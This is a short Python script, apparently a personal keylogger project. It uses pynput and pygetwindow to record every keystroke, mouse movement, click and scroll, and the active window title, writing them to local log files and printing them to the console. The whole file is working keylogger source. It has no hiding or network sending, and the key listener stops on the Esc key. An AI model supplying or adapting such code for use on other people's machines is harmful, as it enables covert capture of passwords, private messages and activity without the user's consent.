from pynput.keyboard import Key, Listener
from pynput import mouse
import pygetwindow as bw
import time

points = []
keys = []
a = []
lists = []

def active_window(a):
    while True:
     time.sleep(1)
     try:
      a = bw.getActiveWindow().title
      print(a)
      lists.append(a)
      write_file0(lists)
     except StopIteration:
       break


def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

    points.append('Pointer moved to {0}'.format(
        (x, y)))
    write_file1(points)


def on_click(x, y, Button1, Button):
    if  Button1 == mouse.Button.left:
        print('Left Click Pressed at {0}'.format((x, y)))
        points.append('Left Click Pressed at {0}'.format((x, y)))          
    else:
        print('Right Click Pressed at {0}'.format((x, y)))
        points.append('Right Click Pressed at {0}'.format((x, y)))
    write_file1(points)


def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))

    points.append('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))
    write_file1(points)

  
def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))


def write_file1(points):
    with open('C:/Users/anuak/Downloads/Keylogger Project/mouse-log.txt', 'w') as f:
        for x in points:
            k = str(x).replace("'", "")
            f.write(k)
            f.write('\n')


def write_file0(lists):
    with open('C:/Users/anuak/Downloads/Keylogger Project/active-window-log.txt', 'w') as f:
        for x in lists:
            k = str(x).replace("'", "")
            f.write(k)
            f.write('\n')


def write_file(keys):
    with open('C:/Users/anuak/Downloads/Keylogger Project/log.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write('\n')


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        return False

listener = mouse.Listener(on_move = on_move,
                    on_click = on_click,
                    on_scroll = on_scroll)
listener.start()

listener = Listener(
              on_press = on_press,
              on_release = on_release)
listener.start()

active_window(a)